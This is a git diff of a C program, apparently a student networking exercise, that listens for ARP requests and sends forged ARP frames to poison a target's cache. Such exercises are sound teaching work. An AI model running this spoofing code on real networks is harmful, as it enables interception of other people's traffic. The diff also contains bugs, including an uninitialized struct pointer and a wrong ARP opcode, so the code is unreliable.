@@ -6,81 +6,11 @@
 /*   By: guferrei <guferrei@student.42sp.org.br>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/01/16 17:11:24 by guferrei          #+#    #+#             */
-/*   Updated: 2024/03/25 15:52:26 by guferrei         ###   ########.fr       */
+/*   Updated: 2024/03/26 15:30:02 by guferrei         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include <stdlib.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <ifaddrs.h>
-#include <netdb.h>
-
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/ioctl.h>
-
-#include <net/if.h>
-#include <net/ethernet.h>
-#include <linux/if_ether.h>
-#include <linux/if_arp.h>
-
-#include <arpa/inet.h>
-
-#include <netinet/ip.h>
-
-#include <string.h>
-
-#include <bits/ioctls.h>
-
-#include "libft/libft.h"
-
-#define NI_MAXHOST 1025
-#define NI_MAXSERV 32
-#define TRUE 1
-#define FALSE 0
-#define IPv4 4
-#define MAC 6
-#define ETH_HDRLEN 14	// Ethernet header length
-#define IP4_HDRLEN 20	// IPv4 header length
-#define ARP_HDRLEN 28	// ARP header length
-
-struct ether_hdr {
-	u_int8_t	dhost[MAC];
-	u_int8_t	shost[MAC];
-	u_int16_t	type;
-} _ether_hdr;
-
-typedef struct arp_hdr {
-	uint16_t htype;
-	uint16_t ptype;
-	uint8_t hlen;
-	uint8_t plen;
-	uint16_t opcode;
-	uint8_t sender_mac[6];
-	uint8_t sender_ip[4];
-	uint8_t target_mac[6];
-	uint8_t target_ip[4];
-} _arp_hdr;
-
-struct ether_arp {
-	struct ether_hdr	ether;
-	struct arp_hdr		arp;
-} _ether_arp;
-
-// struct ifaddrs *findAvailableInterface(void) {
-// 	struct ifaddrs *ifaddr;
-// 	int family;
-// 	int s;
-// 	char host[NI_MAXHOST];
-
-// 	if (getifaddrs(&ifaddr) == -1) {
-// 		perror("getifaddrs");
-// 		return NULL;
-// 	}
-
-// 	return (ifaddr);
-// }
+#include "../include/ft_malcolm.h"
 
 int isValidInput(int argc, char **argv) {
 	if (argc != 5)
@@ -165,33 +95,32 @@ uint8_t *allocate_ustrmem(int len) {
 	}
 }
 
-// char *findAvailableInterface(void) {
-// 	struct ifaddrs *ifaddr;
-// 	int family, s;
-// 	char *if_name;
-// 	char host[NI_MAXHOST];
+char *findAvailableInterface(void) {
+	struct ifaddrs *ifaddr;
+	char *if_name;
+	char host[NI_MAXHOST];
 
-// 	if_name = NULL;
+	if_name = NULL;
 
-// 	if (getifaddrs(&ifaddr) == -1) {
-// 		perror("getifaddrs");
-// 		exit(EXIT_FAILURE);
-// 	}
+	if (getifaddrs(&ifaddr) == -1) {
+		perror("getifaddrs");
+		exit(EXIT_FAILURE);
+	}
 
-// 	for (struct ifaddrs *ifa = ifaddr; ifa != NULL;
-// 		 ifa = ifa->ifa_next) {
-// 		if (ifa->ifa_addr == NULL)
-// 			continue;
+	for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+		if (ifa->ifa_addr == NULL)
+			continue;
 
-// 		if (ifa->ifa_addr->sa_family == AF_INET || ifa->ifa_addr->sa_family == AF_INET6) {
-// 			if_name = ft_strdup(ifa->ifa_name);
-// 			break;
-// 		}
-// 	}
-
-// 	freeifaddrs(ifaddr);
-// 	return(if_name);
-// }
+		if ((ifa->ifa_addr->sa_family == AF_INET ||
+				ifa->ifa_addr->sa_family == AF_INET6) &&
+				!ft_strncmp("eth", ifa->ifa_name, 3)) {
+			if_name = ft_strdup(ifa->ifa_name);
+			break;
+		}
+	}
+	freeifaddrs(ifaddr);
+	return(if_name);
+}
 
 int	is_equal_address(uint8_t *ip_a, uint8_t *ip_b, int flag) {
 	int i;
@@ -205,7 +134,7 @@ int	is_equal_address(uint8_t *ip_a, uint8_t *ip_b, int flag) {
 	return TRUE;
 }
 
-struct arp_hdr *recover_arp_request(uint8_t *target ,uint8_t *ip, uint8_t *mac) {
+struct arp_hdr	*recover_arp_request(struct cli_args *info) {
 	int sd;
 	uint8_t *ether_frame;
 	struct arp_hdr *arp_request;
@@ -227,15 +156,14 @@ struct arp_hdr *recover_arp_request(uint8_t *target ,uint8_t *ip, uint8_t *mac) 
 			exit(EXIT_FAILURE);
 		}
 
-		if (is_equal_address(target, arp_request->target_ip, IPv4) &&
-			is_equal_address(ip, arp_request->sender_ip, IPv4) &&
-			is_equal_address(mac, arp_request->sender_mac, MAC)) {
+		if (is_equal_address(info->source_ip, arp_request->target_ip, IPv4) &&
+			is_equal_address(info->target_ip, arp_request->sender_ip, IPv4) &&
+			is_equal_address(info->target_mac, arp_request->sender_mac, MAC)) {
 			printf("\nREQUEST RECOVERED SUCCESSFULLY!!!!\n\n");
 			close(sd);
 			return (arp_request);
 		}
 	}
-
 	close(sd);
 	return (NULL);
 }
@@ -258,10 +186,9 @@ void	print_ip_n_mac(uint8_t *ip, uint8_t *mac) {
 	}
 }
 
-int	sendArpRequest(struct arp_hdr *arp_request, char *interface, uint8_t *source_ip, uint8_t *spoofed_mac) {
+int	sendArpRequest(struct arp_hdr *arp_request, char *interface, struct cli_args *info) {
 	int	sd, frame_length;
-	struct ether_arp *arp_response;
-	struct addrinfo hints;
+	struct arp_packet *arp_response;
 	struct sockaddr_in *ipv4;
 	struct sockaddr_ll device;
 	uint8_t *ether_frame;
@@ -272,29 +199,23 @@ int	sendArpRequest(struct arp_hdr *arp_request, char *interface, uint8_t *source
 		exit(EXIT_FAILURE);
 	}
 
-	arp_response = ft_calloc(1, sizeof(struct ether_arp));
-
-	memset(&hints, 0, sizeof(struct addrinfo));
-	hints.ai_family = AF_INET;
-	hints.ai_socktype = SOCK_STREAM;
-	hints.ai_flags = hints.ai_flags | AI_CANONNAME;
-
-
 	device.sll_family = AF_PACKET;
-	memcpy(device.sll_addr, spoofed_mac, 6 * sizeof(uint8_t));
+	memcpy(device.sll_addr, info->source_mac, 6 * sizeof(uint8_t));
 	device.sll_halen = 6;
 
+	arp_response = ft_calloc(1, sizeof(struct arp_packet));
+
 	ft_memcpy(arp_response->ether.dhost, arp_request->sender_mac, 6 * sizeof(uint8_t));
-	ft_memcpy(arp_response->ether.shost, spoofed_mac, 6 * sizeof(uint8_t));
+	ft_memcpy(arp_response->ether.shost, info->source_mac, 6 * sizeof(uint8_t));
 	arp_response->ether.type = htons(ETHERTYPE_ARP);
 
 	arp_response->arp.htype = htons(ARPHRD_ETHER);
 	arp_response->arp.ptype = htons(ETHERTYPE_IP);
-	arp_response->arp.hlen = 6;
-	arp_response->arp.plen = 4;
+	arp_response->arp.hlen = MAC;
+	arp_response->arp.plen = IPv4;
 	arp_response->arp.opcode = htons(ARPOP_REQUEST);
 	ft_memcpy(arp_response->arp.sender_ip, arp_request->target_ip, 4 * sizeof(uint8_t));
-	ft_memcpy(arp_response->arp.sender_mac, spoofed_mac, 6 * sizeof(uint8_t));
+	ft_memcpy(arp_response->arp.sender_mac, info->source_mac, 6 * sizeof(uint8_t));
 	ft_memcpy(arp_response->arp.target_ip, arp_request->sender_ip, 4 * sizeof(uint8_t));
 
 	if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
@@ -302,47 +223,44 @@ int	sendArpRequest(struct arp_hdr *arp_request, char *interface, uint8_t *source
 		exit(EXIT_FAILURE);
 	}
 
-	if (sendto(sd, arp_response, sizeof(struct ether_arp), 0, (struct sockaddr *)&device, sizeof(device)) < 0) {
+	if (sendto(sd, arp_response, sizeof(struct arp_packet), 0, (struct sockaddr *)&device, sizeof(device)) < 0) {
 		perror("sendto() failed");
 		exit(EXIT_FAILURE);
 	}
-
-	printf("Finish\n");
-
 	close(sd);
 }
 
+struct cli_args	*get_cli_args(char **argv) {
+	struct cli_args	*input;
+
+	input->source_ip = set_ip(argv[1]);
+	input->source_mac = set_mac(argv[2]);
+	input->target_ip = set_ip(argv[3]);
+	input->target_mac = set_mac(argv[4]);
+
+	if (!input->source_ip || !input->source_mac ||
+			!input->target_ip || !input->target_mac) {
+		perror("get_cli_args");
+		exit(EXIT_FAILURE);
+	}
+
+	return input;
+}
+
 int main(int argc, char **argv) {
-	struct arp_hdr *arp_request;
-	char *interface;
-	uint8_t *target_ip;
-	uint8_t *target_mac;
-	uint8_t *source_ip;
-	uint8_t *source_mac;
+	struct arp_hdr	*arp_request;
+	char 			*interface;
+	struct cli_args	*input;
+
 
 	if (!isValidInput(argc, argv)) {
 		printf("INVALID INPUT\n");
 		exit(1);
 	}
 
-	source_ip = set_ip(argv[1]);
-	source_mac = set_mac(argv[2]);
-	target_ip = set_ip(argv[3]);
-	target_mac = set_mac(argv[4]);
+	input = get_cli_args(argv);
 
-	if (!source_ip || !source_mac || !target_ip || !target_mac) {
-		printf("ERROR!\n");
-		exit(1);
-	}
-
-
-	arp_request = recover_arp_request(source_ip ,target_ip, target_mac);
-
-	printf("Request Recovered of: ");
-	print_ip_n_mac(arp_request->sender_ip, arp_request->sender_mac);
-	printf("Request Sended to: ");
-	print_ip_n_mac(arp_request->target_ip, arp_request->target_mac);
-	printf("\n_______________________\n\n");
-
-	sendArpRequest(arp_request, "eth0", source_ip, source_mac);
+	interface = findAvailableInterface();
+	arp_request = recover_arp_request(input);
+	sendArpRequest(arp_request, interface, input);
 }
